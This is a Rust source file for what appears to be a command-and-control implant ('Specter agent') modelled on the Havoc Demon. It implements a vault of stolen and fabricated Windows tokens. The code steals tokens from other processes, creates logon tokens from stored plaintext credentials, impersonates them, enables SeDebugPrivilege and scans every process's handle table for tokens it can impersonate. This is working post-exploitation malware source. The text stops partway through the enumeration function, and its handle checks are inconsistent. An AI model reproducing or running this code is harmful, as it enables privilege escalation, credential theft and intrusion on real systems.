//! Token vault for the Specter agent.
//!
//! Maintains an in-memory collection of stolen and fabricated Windows tokens,
//! mirroring the Demon agent's `Instance->Tokens` vault.  On Windows the vault
//! holds real `HANDLE` values; on other platforms a lightweight stub is provided
//! so the command handlers can compile and return appropriate error responses.

// ─── Token types ────────────────────────────────────────────────────────────

/// How a token was obtained.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u16)]
pub enum TokenType {
    /// Stolen from a remote process via `OpenProcessToken` + `DuplicateTokenEx`.
    Stolen = 0x1,
    /// Created via `LogonUserW` (network logon).
    MakeNetwork = 0x2,
}

impl TokenType {
    /// Convert from the wire representation.
    pub fn from_u32(v: u32) -> Option<Self> {
        match v {
            0x1 => Some(Self::Stolen),
            0x2 => Some(Self::MakeNetwork),
            _ => None,
        }
    }
}

/// A single entry in the token vault.
#[derive(Debug, Clone)]
pub struct TokenEntry {
    /// Opaque token handle. On Windows this is a `HANDLE` (pointer-sized),
    /// on non-Windows stubs it is always zero.
    pub handle: usize,
    /// `DOMAIN\User` display string.
    pub domain_user: String,
    /// PID of the process the token was stolen from (0 for make tokens).
    pub process_id: u32,
    /// How the token was obtained.
    pub token_type: TokenType,
    /// Credentials stored for make tokens (domain, user, password).
    pub credentials: Option<MakeCredentials>,
}

/// Credentials used to create a make-token via `LogonUserW`.
#[derive(Debug, Clone)]
pub struct MakeCredentials {
    pub domain: String,
    pub user: String,
    pub password: String,
}

// ─── Token vault ────────────────────────────────────────────────────────────

/// In-memory vault of Windows access tokens.
///
/// Token IDs are 0-based indices into the vault.  When a token is removed, its
/// slot is set to `None` so that existing IDs remain stable.
#[derive(Debug)]
pub struct TokenVault {
    /// Sparse list of tokens (removed entries are `None`).
    tokens: Vec<Option<TokenEntry>>,
    /// Index of the currently impersonated token, if any.
    impersonating: Option<usize>,
}

impl Default for TokenVault {
    fn default() -> Self {
        Self::new()
    }
}

impl TokenVault {
    /// Create an empty vault.
    pub fn new() -> Self {
        Self { tokens: Vec::new(), impersonating: None }
    }

    /// Add a token to the vault and return its ID (0-based index).
    pub fn add(&mut self, entry: TokenEntry) -> u32 {
        // Reuse a removed slot if available.
        for (i, slot) in self.tokens.iter_mut().enumerate() {
            if slot.is_none() {
                *slot = Some(entry);
                #[allow(clippy::cast_possible_truncation)]
                return i as u32;
            }
        }
        let id = self.tokens.len();
        self.tokens.push(Some(entry));
        #[allow(clippy::cast_possible_truncation)]
        (id as u32)
    }

    /// Get a reference to a token by ID.
    pub fn get(&self, id: u32) -> Option<&TokenEntry> {
        self.tokens.get(id as usize).and_then(|s| s.as_ref())
    }

    /// Remove a token by ID.  Returns `true` if the token existed.
    ///
    /// On Windows, callers are responsible for closing the underlying handle
    /// before calling this method.
    pub fn remove(&mut self, id: u32) -> bool {
        let idx = id as usize;
        if idx < self.tokens.len() && self.tokens[idx].is_some() {
            // If we're removing the impersonated token, clear impersonation.
            if self.impersonating == Some(idx) {
                self.impersonating = None;
            }
            self.tokens[idx] = None;
            true
        } else {
            false
        }
    }

    /// Clear all tokens from the vault.
    ///
    /// On Windows, callers are responsible for closing underlying handles first.
    pub fn clear(&mut self) {
        self.tokens.clear();
        self.impersonating = None;
    }

    /// Iterate over all live `(id, entry)` pairs.
    pub fn iter(&self) -> impl Iterator<Item = (u32, &TokenEntry)> {
        self.tokens.iter().enumerate().filter_map(|(i, slot)| {
            #[allow(clippy::cast_possible_truncation)]
            slot.as_ref().map(|e| (i as u32, e))
        })
    }

    /// Number of live tokens in the vault.
    pub fn len(&self) -> usize {
        self.tokens.iter().filter(|s| s.is_some()).count()
    }

    /// Whether the vault is empty.
    pub fn is_empty(&self) -> bool {
        self.len() == 0
    }

    /// Set the impersonating token index.
    pub fn set_impersonating(&mut self, id: Option<u32>) {
        self.impersonating = id.map(|i| i as usize);
    }

    /// Get the currently impersonated token ID, if any.
    pub fn impersonating(&self) -> Option<u32> {
        #[allow(clippy::cast_possible_truncation)]
        self.impersonating.map(|i| i as u32)
    }

    /// Check whether a given token ID is the currently impersonated token.
    pub fn is_impersonating(&self, id: u32) -> bool {
        self.impersonating == Some(id as usize)
    }
}

// ─── Token found during system-wide handle enumeration ──────────────────────

/// A token discovered by the system-wide handle-table scan.
///
/// Mirrors the `USER_TOKEN_DATA` struct from the Havoc Demon's `Token.c`.
#[derive(Debug, Clone)]
pub struct FoundToken {
    /// `DOMAIN\User` display string.
    pub domain_user: String,
    /// PID of the owning process.
    pub process_id: u32,
    /// Handle value inside the owning process (0 for the primary token path).
    pub handle: u32,
    /// Mandatory-label integrity level (e.g. `SECURITY_MANDATORY_HIGH_RID`).
    pub integrity_level: u32,
    /// Security-impersonation level for impersonation tokens; 0 for primary.
    pub impersonation_level: u32,
    /// `TokenPrimary` (1) or `TokenImpersonation` (2).
    pub token_type: u32,
}

// ─── Windows native token operations ────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
pub mod native {
    //! Windows-native token manipulation via `windows-sys`.

    use std::mem;
    use std::ptr;

    use windows_sys::Win32::Foundation::{
        BOOL, CloseHandle, FALSE, GetLastError, HANDLE, LUID, TRUE,
    };
    use windows_sys::Win32::Foundation::{STATUS_INFO_LENGTH_MISMATCH, STATUS_SUCCESS};
    use windows_sys::Win32::Security::{
        AdjustTokenPrivileges, DuplicateTokenEx, GetSidSubAuthority, GetSidSubAuthorityCount,
        GetTokenInformation, ImpersonateLoggedOnUser, LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT, LUID_AND_ATTRIBUTES, LogonUserW, LookupAccountSidW,
        LookupPrivilegeNameW, LookupPrivilegeValueW, OpenProcessToken, OpenThreadToken,
        RevertToSelf, SE_PRIVILEGE_ENABLED, SE_PRIVILEGE_ENABLED_BY_DEFAULT,
        SECURITY_IMPERSONATION_LEVEL, SID_NAME_USE, SecurityDelegation, SecurityImpersonation,
        SetThreadToken, TOKEN_ADJUST_PRIVILEGES, TOKEN_ALL_ACCESS, TOKEN_ASSIGN_PRIMARY,
        TOKEN_DUPLICATE, TOKEN_ELEVATION, TOKEN_IMPERSONATE, TOKEN_MANDATORY_LABEL,
        TOKEN_PRIVILEGES, TOKEN_QUERY, TOKEN_STATISTICS, TOKEN_TYPE, TOKEN_USER, TokenElevation,
        TokenImpersonation, TokenImpersonationLevel, TokenIntegrityLevel, TokenPrimary,
        TokenPrivileges, TokenStatistics, TokenUser,
    };
    use windows_sys::Win32::System::SystemServices::MAXIMUM_ALLOWED;
    use windows_sys::Win32::System::Threading::{
        GetCurrentProcess, GetCurrentProcessId, GetCurrentThread, OpenProcess, PROCESS_DUP_HANDLE,
        PROCESS_QUERY_INFORMATION,
    };

    use super::{FoundToken, MakeCredentials, TokenEntry, TokenType};

    /// Steal a token from a target process.
    ///
    /// Opens the process token, duplicates it as an impersonation token,
    /// and returns a `TokenEntry` ready for vault insertion.
    pub fn steal_token(target_pid: u32, _target_handle: u32) -> Result<TokenEntry, u32> {
        let mut process_handle: HANDLE = 0;
        let mut token_handle: HANDLE = 0;
        let mut dup_token: HANDLE = 0;

        unsafe {
            // Open the target process.
            process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, target_pid);
            if process_handle == 0 {
                return Err(GetLastError());
            }

            // Open the process token.
            if OpenProcessToken(process_handle, TOKEN_DUPLICATE | TOKEN_QUERY, &mut token_handle)
                == FALSE
            {
                let err = GetLastError();
                CloseHandle(process_handle);
                return Err(err);
            }

            // Duplicate as an impersonation token.
            if DuplicateTokenEx(
                token_handle,
                TOKEN_ALL_ACCESS,
                ptr::null(),
                SecurityImpersonation,
                TokenImpersonation,
                &mut dup_token,
            ) == FALSE
            {
                let err = GetLastError();
                CloseHandle(token_handle);
                CloseHandle(process_handle);
                return Err(err);
            }

            CloseHandle(token_handle);
            CloseHandle(process_handle);
        }

        let domain_user = query_token_user(dup_token).unwrap_or_else(|| String::from("UNKNOWN"));

        Ok(TokenEntry {
            handle: dup_token as usize,
            domain_user,
            process_id: target_pid,
            token_type: TokenType::Stolen,
            credentials: None,
        })
    }

    /// Create a token via `LogonUserW`.
    pub fn make_token(
        domain: &str,
        user: &str,
        password: &str,
        logon_type: u32,
    ) -> Result<TokenEntry, u32> {
        let domain_w: Vec<u16> = domain.encode_utf16().chain(std::iter::once(0)).collect();
        let user_w: Vec<u16> = user.encode_utf16().chain(std::iter::once(0)).collect();
        let password_w: Vec<u16> = password.encode_utf16().chain(std::iter::once(0)).collect();

        let mut token_handle: HANDLE = 0;

        unsafe {
            if LogonUserW(
                user_w.as_ptr(),
                domain_w.as_ptr(),
                password_w.as_ptr(),
                logon_type,
                LOGON32_PROVIDER_DEFAULT,
                &mut token_handle,
            ) == FALSE
            {
                return Err(GetLastError());
            }
        }

        let domain_user = format!("{domain}\\{user}");

        Ok(TokenEntry {
            handle: token_handle as usize,
            domain_user,
            process_id: unsafe { GetCurrentProcessId() },
            token_type: TokenType::MakeNetwork,
            credentials: Some(MakeCredentials {
                domain: domain.to_string(),
                user: user.to_string(),
                password: password.to_string(),
            }),
        })
    }

    /// Impersonate a token on the current thread.
    pub fn impersonate_token(handle: usize) -> Result<(), u32> {
        unsafe {
            if SetThreadToken(ptr::null(), handle as HANDLE) == FALSE {
                return Err(GetLastError());
            }
        }
        Ok(())
    }

    /// Revert the current thread to its original token.
    pub fn revert_to_self() -> Result<(), u32> {
        unsafe {
            if RevertToSelf() == FALSE {
                return Err(GetLastError());
            }
        }
        Ok(())
    }

    /// Query whether the given token is elevated.
    pub fn is_token_elevated(handle: usize) -> bool {
        let mut elevation = TOKEN_ELEVATION { TokenIsElevated: 0 };
        let mut ret_len: u32 = 0;
        unsafe {
            if GetTokenInformation(
                handle as HANDLE,
                TokenElevation,
                &mut elevation as *mut _ as *mut _,
                mem::size_of::<TOKEN_ELEVATION>() as u32,
                &mut ret_len,
            ) == FALSE
            {
                return false;
            }
        }
        elevation.TokenIsElevated != 0
    }

    /// Query the `DOMAIN\User` string from a token handle.
    pub fn query_token_user(handle: HANDLE) -> Option<String> {
        let mut needed: u32 = 0;

        // First call to get required buffer size.
        unsafe {
            GetTokenInformation(handle, TokenUser, ptr::null_mut(), 0, &mut needed);
        }
        if needed == 0 {
            return None;
        }

        let mut buf = vec![0u8; needed as usize];
        unsafe {
            if GetTokenInformation(handle, TokenUser, buf.as_mut_ptr().cast(), needed, &mut needed)
                == FALSE
            {
                return None;
            }
        }

        let token_user: &TOKEN_USER = unsafe { &*(buf.as_ptr().cast()) };
        let sid = token_user.User.Sid;

        // Resolve SID to account name.
        let mut user_len: u32 = 256;
        let mut domain_len: u32 = 256;
        let mut user_buf = vec![0u16; user_len as usize];
        let mut domain_buf = vec![0u16; domain_len as usize];
        let mut sid_type: SID_NAME_USE = 0;

        unsafe {
            if LookupAccountSidW(
                ptr::null(),
                sid,
                user_buf.as_mut_ptr(),
                &mut user_len,
                domain_buf.as_mut_ptr(),
                &mut domain_len,
                &mut sid_type,
            ) == FALSE
            {
                return None;
            }
        }

        let domain = String::from_utf16_lossy(&domain_buf[..domain_len as usize]);
        let user = String::from_utf16_lossy(&user_buf[..user_len as usize]);
        Some(format!("{domain}\\{user}"))
    }

    /// Get the current thread or process token handle.
    pub fn current_token_handle() -> Result<HANDLE, u32> {
        let mut handle: HANDLE = 0;
        unsafe {
            // Try thread token first (if impersonating).
            if OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &mut handle) != FALSE {
                return Ok(handle);
            }
            // Fall back to process token.
            if OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &mut handle) == FALSE {
                return Err(GetLastError());
            }
        }
        Ok(handle)
    }

    /// Query current token user string and elevation status.
    pub fn get_uid() -> Result<(bool, String), u32> {
        let handle = current_token_handle()?;
        let elevated = is_token_elevated(handle as usize);
        let user = query_token_user(handle).unwrap_or_else(|| String::from("UNKNOWN"));
        unsafe {
            CloseHandle(handle);
        }
        Ok((elevated, user))
    }

    /// List privileges on the current token.
    ///
    /// Returns `Vec<(privilege_name, attributes)>`.
    pub fn list_privileges() -> Result<Vec<(String, u32)>, u32> {
        let handle = current_token_handle()?;
        let mut needed: u32 = 0;

        // Get required size.
        unsafe {
            GetTokenInformation(handle, TokenPrivileges, ptr::null_mut(), 0, &mut needed);
        }
        if needed == 0 {
            unsafe { CloseHandle(handle) };
            return Err(unsafe { GetLastError() });
        }

        let mut buf = vec![0u8; needed as usize];
        unsafe {
            if GetTokenInformation(
                handle,
                TokenPrivileges,
                buf.as_mut_ptr().cast(),
                needed,
                &mut needed,
            ) == FALSE
            {
                let err = GetLastError();
                CloseHandle(handle);
                return Err(err);
            }
        }

        let privs: &TOKEN_PRIVILEGES = unsafe { &*(buf.as_ptr().cast()) };
        let count = privs.PrivilegeCount as usize;
        let privileges = unsafe { std::slice::from_raw_parts(privs.Privileges.as_ptr(), count) };

        let mut result = Vec::with_capacity(count);
        for laa in privileges {
            let name = lookup_privilege_name(&laa.Luid);
            result.push((name, laa.Attributes));
        }

        unsafe { CloseHandle(handle) };
        Ok(result)
    }

    /// Enable a privilege by name on the current token.
    pub fn enable_privilege(priv_name: &str) -> Result<bool, u32> {
        let handle = current_token_handle()?;
        // Need TOKEN_ADJUST_PRIVILEGES.
        let mut adj_handle: HANDLE = 0;
        unsafe {
            if OpenThreadToken(
                GetCurrentThread(),
                TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                TRUE,
                &mut adj_handle,
            ) == FALSE
            {
                if OpenProcessToken(
                    GetCurrentProcess(),
                    TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                    &mut adj_handle,
                ) == FALSE
                {
                    CloseHandle(handle);
                    return Err(GetLastError());
                }
            }
            CloseHandle(handle);
        }

        let name_w: Vec<u16> = priv_name.encode_utf16().chain(std::iter::once(0)).collect();
        let mut luid = LUID { LowPart: 0, HighPart: 0 };

        unsafe {
            if LookupPrivilegeValueW(ptr::null(), name_w.as_ptr(), &mut luid) == FALSE {
                CloseHandle(adj_handle);
                return Err(GetLastError());
            }
        }

        let mut tp = TOKEN_PRIVILEGES {
            PrivilegeCount: 1,
            Privileges: [LUID_AND_ATTRIBUTES { Luid: luid, Attributes: SE_PRIVILEGE_ENABLED }],
        };

        unsafe {
            if AdjustTokenPrivileges(
                adj_handle,
                FALSE,
                &mut tp,
                0,
                ptr::null_mut(),
                ptr::null_mut(),
            ) == FALSE
            {
                let err = GetLastError();
                CloseHandle(adj_handle);
                return Err(err);
            }
            // Check if the adjustment actually took effect.
            let err = GetLastError();
            CloseHandle(adj_handle);
            // ERROR_NOT_ALL_ASSIGNED = 1300
            Ok(err != 1300)
        }
    }

    /// Close a token handle.
    pub fn close_token_handle(handle: usize) {
        if handle != 0 {
            unsafe {
                CloseHandle(handle as HANDLE);
            }
        }
    }

    /// Look up a privilege name from its LUID.
    fn lookup_privilege_name(luid: &LUID) -> String {
        let mut name_buf = vec![0u16; 256];
        let mut name_len: u32 = 256;
        unsafe {
            if LookupPrivilegeNameW(ptr::null(), luid, name_buf.as_mut_ptr(), &mut name_len)
                == FALSE
            {
                return format!("LUID({},{})", luid.LowPart, luid.HighPart);
            }
        }
        String::from_utf16_lossy(&name_buf[..name_len as usize])
    }

    // ─── NT syscall declarations ─────────────────────────────────────────────

    /// Raw NT functions not exposed by the `windows-sys` `Win32` feature set.
    ///
    /// Linked against `ntdll.dll` which is always present on Windows.
    #[link(name = "ntdll")]
    extern "system" {
        /// Query system-wide information (used with `SystemHandleInformation = 16`).
        fn NtQuerySystemInformation(
            system_information_class: i32,
            system_information: *mut core::ffi::c_void,
            system_information_length: u32,
            return_length: *mut u32,
        ) -> i32;

        /// Query information about a kernel object.
        /// Pass `NULL` handle with `ObjectTypesInformation = 3` to enumerate all types.
        fn NtQueryObject(
            handle: HANDLE,
            object_information_class: i32,
            object_information: *mut core::ffi::c_void,
            object_information_length: u32,
            return_length: *mut u32,
        ) -> i32;

        /// Duplicate a handle from a remote process into the current process.
        fn NtDuplicateObject(
            source_process_handle: HANDLE,
            source_handle: HANDLE,
            target_process_handle: HANDLE,
            target_handle: *mut HANDLE,
            desired_access: u32,
            handle_attributes: u32,
            options: u32,
        ) -> i32;
    }

    // ─── NT struct layouts ───────────────────────────────────────────────────

    /// `SystemHandleInformation` class value for `NtQuerySystemInformation`.
    const SYSTEM_HANDLE_INFORMATION_CLASS: i32 = 16;

    /// `ObjectTypesInformation` class value for `NtQueryObject` (NULL handle).
    const OBJECT_TYPES_INFORMATION_CLASS: i32 = 3;

    /// `DUPLICATE_SAME_ACCESS` option for `NtDuplicateObject`.
    const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;

    /// One entry in the system-wide handle table.
    ///
    /// Layout matches `SYSTEM_HANDLE_TABLE_ENTRY_INFO` on x64 Windows:
    /// sizes = [u16, u16, u8, u8, u16, ptr(8), u32] + 4-byte trailing pad = 24 bytes.
    #[repr(C)]
    struct SystemHandleEntry {
        unique_process_id: u16,
        creator_back_trace_index: u16,
        object_type_index: u8,
        handle_attributes: u8,
        handle_value: u16,
        object: *mut core::ffi::c_void,
        granted_access: u32,
        // 4 bytes implicit trailing padding (struct alignment = 8 on x64)
    }

    // ─── Handle-table helpers ────────────────────────────────────────────────

    /// Call `NtQuerySystemInformation(SystemHandleInformation)` and return the
    /// raw byte buffer on success, or `None` on failure.
    ///
    /// The buffer starts with a `u32` handle count at offset 0, then 4 bytes of
    /// alignment padding, followed by the `SYSTEM_HANDLE_TABLE_ENTRY_INFO` array.
    fn get_all_handles() -> Option<Vec<u8>> {
        let mut buf_size: u32 = 0x1_0000; // start at 64 KiB
        loop {
            let mut buf = vec![0u8; buf_size as usize];
            let mut returned: u32 = 0;
            let status = unsafe {
                NtQuerySystemInformation(
                    SYSTEM_HANDLE_INFORMATION_CLASS,
                    buf.as_mut_ptr().cast(),
                    buf_size,
                    &mut returned,
                )
            };
            if status == STATUS_SUCCESS {
                return Some(buf);
            }
            if status == STATUS_INFO_LENGTH_MISMATCH {
                buf_size = returned.max(buf_size.saturating_add(0x1_0000));
                continue;
            }
            return None;
        }
    }

    /// Return the object-type index for `"Token"` objects by calling
    /// `NtQueryObject(NULL, ObjectTypesInformation)`.
    ///
    /// On Windows the type index equals `loop_position + 2` (types are 1-indexed
    /// starting from 2 in the kernel).
    fn get_type_index_token() -> Option<u8> {
        // Layout of the returned buffer:
        //   [u32 NumberOfTypes][4 bytes pad][OBJECT_TYPE_INFORMATION_V2 entries...]
        //
        // Each OBJECT_TYPE_INFORMATION_V2 entry is 104 bytes, followed by
        // the TypeName string (MaximumLength bytes), padded to 8-byte alignment.
        //
        // OBJECT_TYPE_INFORMATION_V2 offsets (x64):
        //   0: TypeName.Length      (u16)
        //   2: TypeName.MaximumLength (u16)
        //   8: TypeName.Buffer      (*const u16)
        const OBJ_TYPE_INFO_SIZE: usize = 104;
        const TYPE_NAME_LENGTH_OFF: usize = 0;
        const TYPE_NAME_MAX_LENGTH_OFF: usize = 2;
        const TYPE_NAME_BUFFER_OFF: usize = 8;

        let mut buf_size: u32 = 0x1000;
        let buf = loop {
            let mut buf = vec![0u8; buf_size as usize];
            let mut returned: u32 = 0;
            let status = unsafe {
                NtQueryObject(
                    ptr::null_mut(), // NULL handle → enumerate all types
                    OBJECT_TYPES_INFORMATION_CLASS,
                    buf.as_mut_ptr().cast(),
                    buf_size,
                    &mut returned,
                )
            };
            if status == STATUS_SUCCESS {
                break buf;
            }
            if status == STATUS_INFO_LENGTH_MISMATCH {
                buf_size = returned.max(buf_size.saturating_add(0x1000));
                continue;
            }
            return None;
        };

        if buf.len() < 8 {
            return None;
        }
        let number_of_types = u32::from_ne_bytes([buf[0], buf[1], buf[2], buf[3]]) as usize;

        // First entry starts at offset 8 (ALIGN_UP(sizeof(u32)=4, ULONG_PTR=8) = 8).
        let mut offset: usize = 8;

        for i in 0..number_of_types {
            if offset + OBJ_TYPE_INFO_SIZE > buf.len() {
                break;
            }

            // Read TypeName.Length (UTF-16 byte count of the name, not including null).
            let type_name_len = u16::from_ne_bytes([
                buf[offset + TYPE_NAME_LENGTH_OFF],
                buf[offset + TYPE_NAME_LENGTH_OFF + 1],
            ]) as usize;

            // Read TypeName.MaximumLength (allocated size, used for advancing to next entry).
            let max_len = u16::from_ne_bytes([
                buf[offset + TYPE_NAME_MAX_LENGTH_OFF],
                buf[offset + TYPE_NAME_MAX_LENGTH_OFF + 1],
            ]) as usize;

            // Read the TypeName.Buffer pointer so we can compare the name string.
            let buf_ptr_bytes: [u8; 8] = buf
                [offset + TYPE_NAME_BUFFER_OFF..offset + TYPE_NAME_BUFFER_OFF + 8]
                .try_into()
                .unwrap_or([0u8; 8]);
            let name_ptr = usize::from_ne_bytes(buf_ptr_bytes) as *const u16;

            // "Token" in UTF-16 is 5 code units = 10 bytes.
            if type_name_len == 10 && !name_ptr.is_null() {
                // Safe: the kernel wrote these pointers into our buffer; as long
                // as the buffer is alive the pointed-to data is valid.
                let name_slice = unsafe { std::slice::from_raw_parts(name_ptr, 5) };
                if name_slice == [b'T' as u16, b'o' as u16, b'k' as u16, b'e' as u16, b'n' as u16] {
                    // Type index is loop position + 2 (kernel types are 1-indexed from 2).
                    #[allow(clippy::cast_possible_truncation)]
                    return Some((i + 2) as u8);
                }
            }

            // Advance to next entry: sizeof(OBJECT_TYPE_INFORMATION) + ALIGN_UP(MaximumLength, 8).
            let aligned_name = (max_len + 7) & !7;
            offset = offset.saturating_add(OBJ_TYPE_INFO_SIZE + aligned_name);
        }

        None
    }

    // ─── Token quality checks ────────────────────────────────────────────────

    /// Test whether a token can actually be used for impersonation by trying to
    /// impersonate it on the current thread and then reverting.
    ///
    /// Mirrors the Havoc `CanTokenBeImpersonated()` function.
    fn can_token_be_impersonated(token: HANDLE) -> bool {
        // Try to impersonate.
        if unsafe { ImpersonateLoggedOnUser(token) } == FALSE {
            return false;
        }

        // Grab the resulting thread token.
        let mut imp_token: HANDLE = ptr::null_mut();
        let opened =
            unsafe { OpenThreadToken(GetCurrentThread(), MAXIMUM_ALLOWED, TRUE, &mut imp_token) };

        // Always revert before we do anything that might fail.
        unsafe { RevertToSelf() };

        if opened == FALSE {
            return false;
        }

        // The thread token must itself be an impersonation token.
        let mut stats_buf = vec![0u8; mem::size_of::<TOKEN_STATISTICS>()];
        let mut ret_len: u32 = 0;
        let ok = unsafe {
            GetTokenInformation(
                imp_token,
                TokenStatistics,
                stats_buf.as_mut_ptr().cast(),
                stats_buf.len() as u32,
                &mut ret_len,
            )
        };
        unsafe { CloseHandle(imp_token) };

        if ok == FALSE {
            return false;
        }

        let stats: &TOKEN_STATISTICS = unsafe { &*(stats_buf.as_ptr().cast()) };
        stats.TokenType == TokenImpersonation && stats.ImpersonationLevel >= SecurityImpersonation
    }

    /// Read `TokenStatistics`, `TokenIntegrityLevel`, and the owner string from
    /// a token handle.
    ///
    /// Returns `None` if the token is not suitable for impersonation (wrong type
    /// or insufficient impersonation level).
    fn token_info_for_find(
        token: HANDLE,
    ) -> Option<(String, u32 /* type */, u32 /* integrity */, u32 /* imp level */)> {
        // ── 1. TOKEN_STATISTICS → type + impersonation level ─────────────────
        let mut stats_buf = vec![0u8; mem::size_of::<TOKEN_STATISTICS>()];
        let mut ret_len: u32 = 0;
        if unsafe {
            GetTokenInformation(
                token,
                TokenStatistics,
                stats_buf.as_mut_ptr().cast(),
                stats_buf.len() as u32,
                &mut ret_len,
            )
        } == FALSE
        {
            return None;
        }
        let stats: &TOKEN_STATISTICS = unsafe { &*(stats_buf.as_ptr().cast()) };
        let token_type = stats.TokenType as u32;
        let imp_level = stats.ImpersonationLevel as u32;

        // Only keep primary tokens and high-enough impersonation tokens.
        let keep = token_type == TokenPrimary as u32
            || imp_level >= SecurityImpersonation as u32
            || imp_level >= SecurityDelegation as u32;
        if !keep {
            return None;
        }

        // ── 2. TOKEN_MANDATORY_LABEL → integrity level ────────────────────────
        let mut integrity: u32 = 0;
        if token_type == TokenPrimary as u32 {
            let mut needed: u32 = 0;
            unsafe {
                GetTokenInformation(token, TokenIntegrityLevel, ptr::null_mut(), 0, &mut needed)
            };
            if needed > 0 {
                let mut il_buf = vec![0u8; needed as usize];
                if unsafe {
                    GetTokenInformation(
                        token,
                        TokenIntegrityLevel,
                        il_buf.as_mut_ptr().cast(),
                        needed,
                        &mut needed,
                    )
                } != FALSE
                {
                    let label: &TOKEN_MANDATORY_LABEL = unsafe { &*(il_buf.as_ptr().cast()) };
                    if !label.Label.Sid.is_null() {
                        let count = unsafe { *GetSidSubAuthorityCount(label.Label.Sid) } as u32;
                        if count > 0 {
                            integrity = unsafe { *GetSidSubAuthority(label.Label.Sid, count - 1) };
                        }
                    }
                }
            }
        } else {
            // For impersonation tokens we skip the integrity query to match the
            // Havoc reference implementation which only reads it for primary tokens.
        }

        // ── 3. Owner string ───────────────────────────────────────────────────
        let owner = query_token_user(token)?;

        Some((owner, token_type, integrity, imp_level))
    }

    // ─── Deduplication helper ────────────────────────────────────────────────

    /// Add `candidate` to `list` only if no existing entry is identical on all
    /// five key fields (mirrors `AddUserToken` in the Havoc Demon source).
    fn add_unique_found_token(list: &mut Vec<FoundToken>, candidate: FoundToken) {
        for existing in list.iter() {
            let handles_same_class = (existing.handle == 0) == (candidate.handle == 0);
            if existing.domain_user == candidate.domain_user
                && existing.token_type == candidate.token_type
                && existing.integrity_level == candidate.integrity_level
                && existing.impersonation_level == candidate.impersonation_level
                && handles_same_class
            {
                return;
            }
        }
        list.push(candidate);
    }

    // ─── Public entry point ──────────────────────────────────────────────────

    /// Enumerate all impersonatable tokens across every process on the system.
    ///
    /// Implements the full `ListTokens()` logic from the Havoc Demon's
    /// `src/core/Token.c`: scans `NtQuerySystemInformation(SystemHandleInformation)`,
    /// collects unique PIDs, opens each process, duplicates every token-type handle
    /// via `NtDuplicateObject`, tests impersonatability, and deduplicates results.
    ///
    /// Requires `SeDebugPrivilege` to open most processes; it is requested before
    /// the scan begins (best-effort — tokens without the privilege are silently
    /// skipped).
    pub fn list_found_tokens() -> Vec<FoundToken> {
        let mut result: Vec<FoundToken> = Vec::new();

        // Get our own username so we can skip our own tokens.
        let own_username: Option<String> = current_token_handle().ok().and_then(|h| {
            let user = query_token_user(h);
            unsafe { CloseHandle(h) };
            user
        });

        // Enable SeDebugPrivilege (best-effort).
        let _ = enable_privilege("SeDebugPrivilege");

        // Find the kernel object-type index for "Token".
        let token_type_index = match get_type_index_token() {
            Some(idx) => idx,
            None => return result,
        };

        // Fetch the full system handle table.
        let handle_buf = match get_all_handles() {
            Some(buf) => buf,
            None => return result,
        };

        if handle_buf.len() < 8 {
            return result;
        }

        // Parse number of handles (first u32) and locate the entry array.
        // The entry array starts at offset 8 (4-byte ULONG + 4-byte padding to
        // align SYSTEM_HANDLE_TABLE_ENTRY_INFO which requires 8-byte alignment).
        let num_handles =
            u32::from_ne_bytes([handle_buf[0], handle_buf[1], handle_buf[2], handle_buf[3]])
                as usize;

        let entry_size = mem::size_of::<SystemHandleEntry>();
        let entries_needed = 8usize.saturating_add(num_handles.saturating_mul(entry_size));
        if handle_buf.len() < entries_needed {
            return result;
        }

        let entries: &[SystemHandleEntry] = unsafe {
            let ptr = handle_buf.as_ptr().add(8).cast::<SystemHandleEntry>();
            std::slice::from_raw_parts(ptr, num_handles)
        };

        // Collect unique PIDs that appear in the handle table.
        let our_pid = unsafe { GetCurrentProcessId() };
        let mut seen_pids = std::collections::HashSet::new();
        let mut pids: Vec<u32> = Vec::new();
        for entry in entries {
            let pid = entry.unique_process_id as u32;
            if pid == 0 || pid == 4 || pid == our_pid {
                continue;
            }
            if seen_pids.insert(pid) {
                pids.push(pid);
            }
        }

        let current_proc = unsafe { GetCurrentProcess() };

        for pid in pids {
            // Open the target process with the access rights needed for handle
            // duplication and token querying.
            let proc_handle =
                unsafe { OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, FALSE, pid) };
            if proc_handle.is_null() {
                continue;
            }

            // ── Enumerate every token-type handle from this process ───────────
            for entry in entries {
                if entry.unique_process_id as u32 != pid {
                    continue;
                }
                if entry.object_type_index != token_type_index {
                    continue;
                }

                // Duplicate the handle into our process.
                let src_handle = entry.handle_value as usize as HANDLE;
                let mut dup: HANDLE = ptr::null_mut();
                let status = unsafe {
                    NtDuplicateObject(
                        proc_handle,
                        src_handle,
                        current_proc,
                        &mut dup,
                        0,
                        0,
                        DUPLICATE_SAME_ACCESS,
                    )
                };
                if status != STATUS_SUCCESS {
                    continue;
                }

                if let Some((owner, tok_type, integrity, imp)) = token_info_for_find(dup) {
                    // Skip our own user (same logic as Havoc's IsNotCurrentUser).
                    let is_self = own_username.as_deref().map(|u| u == owner).unwrap_or(false);
                    if !is_self && can_token_be_impersonated(dup) {
                        add_unique_found_token(
                            &mut result,
                            FoundToken {
                                domain_user: owner,
                                process_id: pid,
                                handle: entry.handle_value as u32,
                                integrity_level: integrity,
                                impersonation_level: imp,
                                token_type: tok_type,
                            },
                        );
                    }
                }

                unsafe { CloseHandle(dup) };
            }

            // ── Also probe the primary process token ─────────────────────────
            let mut prim: HANDLE = ptr::null_mut();
            if unsafe { OpenProcessToken(proc_handle, TOKEN_DUPLICATE | TOKEN_QUERY, &mut prim) }
                != FALSE
            {
                if let Some((owner, tok_type, integrity, imp)) = token_info_for_find(prim) {
                    let is_self = own_username.as_deref().map(|u| u == owner).unwrap_or(false);
                    if !is_self && can_token_be_impersonated(prim) {
                        add_unique_found_token(
                            &mut result,
                            FoundToken {
                                domain_user: owner,
                                process_id: pid,
                                handle: 0, // primary token path has no local handle
                                integrity_level: integrity,
                                impersonation_level: imp,
                                token_type: tok_type,
                            },
                        );
                    }
                }
                unsafe { CloseHandle(prim) };
            }

